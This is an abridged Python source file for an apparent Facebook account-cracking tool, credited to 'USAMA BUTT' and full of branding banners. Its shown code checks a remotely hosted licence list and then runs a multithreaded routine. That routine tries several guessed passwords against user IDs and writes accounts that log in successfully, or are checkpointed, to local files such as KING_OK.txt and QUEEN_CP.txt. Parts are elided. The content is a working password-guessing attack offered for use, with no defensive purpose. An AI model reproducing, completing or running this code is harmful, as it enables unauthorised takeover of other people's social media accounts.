...
__author__ = 'USAMA BUTT'
__copyright = 'All rights reserved . Copyright  USAMA BUTT'
...
\033[1;97m➣ UNITY  : \033[1;97mKSU OWNERS
\033[1;97m➣ WP  : \033[1;97m03124664057
\033[1;94m==============================================="""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/usamabutt486/Ksutigers/main/server.txt').text
    if to in r:
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─USAMA  HERE➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\033[1;92m╰─USAMA HERE➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─AK HERE➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mUSAMA King Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[USAMA-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/KING_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[OBAID-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[USAMA-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/KING_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[AAQIB-CP] ' + uid + ' | ' + pass2
                    cp = open('QUEEN_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[USAMA-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/KING_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[AAQIB X OBAID-CP] ' + uid + ' | ' + pass3
                        cp = open('QUEEN_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[KSU-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/KING_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[KSU-CP] ' + uid + ' | ' + pass4
                            cp = open('QUEEN_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92m USAMA X OBAID X AAQIB PROCCESS COMPLETE'
